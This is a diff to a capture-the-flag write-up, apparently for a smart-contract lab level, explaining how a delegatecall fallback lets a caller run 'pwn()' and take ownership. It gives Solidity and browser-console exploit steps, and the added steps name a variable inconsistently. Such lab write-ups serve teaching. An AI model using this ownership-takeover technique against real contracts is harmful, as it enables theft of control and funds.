@@ -11,3 +11,10 @@ When using delegatecall there is 2 things to keep in mind:
 In this level, we have Delegation contract is making call to contract Delegate through a fallback function.
 So we can trigger the attack by sending a call function and inside it we add "pwn()" the name of the function we want to call.
 ``` owner.call(abi.encodeWithSignature("pwn()")); ```
+
+## Solving it directly in the browser
+
+It is also possible to slove it with no need to create contract. So we want to pass data to the sendTransaction function, this data will be "pwn()" so that it can call it in the above contract.
+1. pwnFunc = web3.utils.sha3("pwn()") we will have the hash now.
+2. await contract.sendTransaction({data: pwnFunction})
+
